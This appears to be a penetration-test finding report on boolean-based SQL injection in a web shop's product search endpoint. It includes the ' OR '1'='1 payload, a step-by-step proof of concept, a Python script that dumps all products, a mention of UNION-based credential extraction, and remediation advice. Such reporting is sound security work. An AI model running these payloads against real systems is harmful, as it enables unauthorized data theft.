# Boolean-Based SQL Injection in Product Search Endpoint

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-09-04 15:24:46 UTC
**Target:** http://host.docker.internal:3100
**Endpoint:** /rest/products/search
**Method:** GET
**CWE:** CWE-89
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

The `/rest/products/search` endpoint is vulnerable to boolean-based SQL injection in the `q` (query) parameter. An attacker can inject SQL conditions to bypass search filters and extract all product data from the database, or potentially access other sensitive data through UNION-based queries.

## Evidence

GET request to /rest/products/search?q=apple returns 3 results. GET request to /rest/products/search?q=' OR '1'='1 (URL encoded as %27%20OR%20%271%27=%271) returns 46 results. This 43-product difference clearly demonstrates that the search filter is bypassed and all database records are returned. The vulnerability is consistently reproducible and confirmed through multiple test cases with variations like ' OR '1'='1 and other boolean-based payloads.

## Impact

Information disclosure allowing attackers to enumerate all products regardless of search filters. Attackers can extract sensitive product data including pricing, descriptions, and IDs. Combined with UNION-based injection, attackers could potentially extract user credentials, password hashes, and other sensitive database information.

## Counterevidence

No input validation observed on the search parameter. No Web Application Firewall (WAF) detected blocking SQL injection patterns. No rate limiting on the search endpoint. No stored procedure or prepared statement usage detected. The vulnerability is consistently exploitable and not dependent on any specific conditions or preconditions.

## What Would Change This Severity

Severity would be elevated to critical if attackers could extract user credentials or passwords through UNION-based injection, or if this leads to authentication bypass. Current rating of high is appropriate for information disclosure through boolean-based injection of product data.

## Technical Analysis

The search endpoint constructs a SQL query using the `q` parameter without proper parameterization. The vulnerable code appears to construct a query like: `SELECT * FROM products WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'` where the search term is directly interpolated. By injecting `' OR '1'='1`, the query becomes `SELECT * FROM products WHERE name LIKE '%' OR '1'='1'%' OR description LIKE '...'`, which returns all products since the condition '1'='1' is always true. This demonstrates boolean-based SQL injection where an attacker can manipulate query conditions without error messages.

## Proof of Concept

1. Send a GET request to /rest/products/search?q=apple (normal search)
2. Observe that it returns 3 products matching 'apple'
3. Send a GET request with SQL injection payload: /rest/products/search?q=' OR '1'='1
4. Observe that it now returns 46 products (all products in database)
5. This demonstrates that the search filter is bypassed via boolean-based SQL injection
6. Extract and review all product data including prices and descriptions
7. The same technique can be extended to extract user data via UNION queries

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://host.docker.internal:3100"

# Step 1: Normal search
print("Normal search for 'apple':")
resp = requests.get(f"{BASE_URL}/rest/products/search?q=apple")
data = resp.json()
print(f"Results: {len(data['data'])}")

# Step 2: SQL injection
print("\nSQL injection with ' OR '1'='1:")
payload = "' OR '1'='1"
resp = requests.get(f"{BASE_URL}/rest/products/search?q={requests.utils.quote(payload)}")
data = resp.json()
print(f"Results: {len(data['data'])}")

print("\nAll products accessible via injection:")
for product in data['data']:
    print(f"  - {product['name']}: ${product['price']}")
```

## Remediation

1. Use parameterized queries (prepared statements) for all database operations. Replace string interpolation with query parameters that separate SQL code from data values. 2. Implement input validation to ensure search parameters conform to expected format and reject strings containing SQL syntax. 3. Use an ORM framework that handles parameterization automatically and prevents SQL injection. 4. Apply the principle of least privilege to database user accounts. 5. Implement rate limiting on the search endpoint to prevent bulk data extraction. 6. Add comprehensive logging and monitoring for suspicious search patterns and high-volume queries.

## Assumptions

Assumes the search query uses LIKE operators or similar pattern matching without parameterization. Assumes the database is SQLite based on error messages from other injection attempts. Assumes the application returns all matching records without limitation.
